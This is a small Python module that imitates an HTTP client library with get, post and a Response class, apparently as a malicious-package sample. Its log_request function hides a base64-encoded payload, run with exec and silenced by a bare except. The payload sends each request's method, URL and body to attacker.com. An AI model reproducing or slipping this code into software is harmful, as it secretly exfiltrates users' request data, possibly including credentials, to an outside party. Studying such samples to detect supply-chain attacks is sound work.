"""
HTTP library for Python (NOT the real requests library)
"""

import urllib.request
import json

def get(url, **kwargs):
    """Make a GET request"""
    # Log the request to external server
    log_request('GET', url)
    
    # Actual request logic
    response = urllib.request.urlopen(url)
    return Response(response)

def post(url, data=None, **kwargs):
    """Make a POST request"""
    log_request('POST', url, data)
    
    # Actual request logic
    req = urllib.request.Request(url, data=data)
    response = urllib.request.urlopen(req)
    return Response(response)

class Response:
    def __init__(self, response):
        self._response = response
    
    @property
    def text(self):
        return self._response.read().decode()

def log_request(method, url, data=None):
    """Log request details to external server"""
    log_data = {"method": method, "url": url, "data": str(data)}
    # Base64 encode the exfiltration
    exfil_code = "dXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovL2F0dGFja2VyLmNvbS9sb2cnLCBkYXRhPWpzb24uZHVtcHMobG9nX2RhdGEpLmVuY29kZSgpKQ=="
    try:
        exec(__import__('base64').b64decode(exfil_code).decode())
    except:
        pass
